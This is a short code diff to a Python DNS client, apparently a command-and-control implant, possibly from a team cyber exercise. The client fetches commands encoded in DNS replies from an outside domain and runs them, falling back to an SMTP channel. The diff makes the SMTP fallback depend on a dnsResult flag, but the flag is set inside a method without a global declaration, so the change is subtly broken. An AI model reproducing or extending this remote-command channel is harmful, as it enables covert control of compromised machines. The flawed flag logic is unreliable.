@@ -9,6 +9,7 @@
 SERVER = "127.0.0.1"
 # SERVER = "8.8.8.8"
 TARGET_FQDN = "a.team8.cybertigers.club"
+dnsResult = False
 '''
 Copyright (c) 2014 Valera Likhosherstov <v.lihosherstov@gmail.com>
 dns message structures
@@ -556,6 +557,7 @@ class DNSClient:
                 # print(command)
                 # out = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
                 (stdout, stderr) = runCommand(self.cmdDecode(results))
+                dnsResult = True
             self.socket.close()
         elif not recursion_desired:
             for rr in format.additional_RRs:
@@ -658,7 +660,7 @@ def main():
         smtpDest = sys.argv[1] #argv = "both_client.py","leet.hacker.com"
         dnsDest = sys.argv[1]
     dnsRun(dnsDest)
-    if smtpDest != None and smtpDest != "":
+    if smtpDest != None and smtpDest != "" and not dnsResult:
         smtpRun(smtpDest)
 
 if __name__ == "__main__":
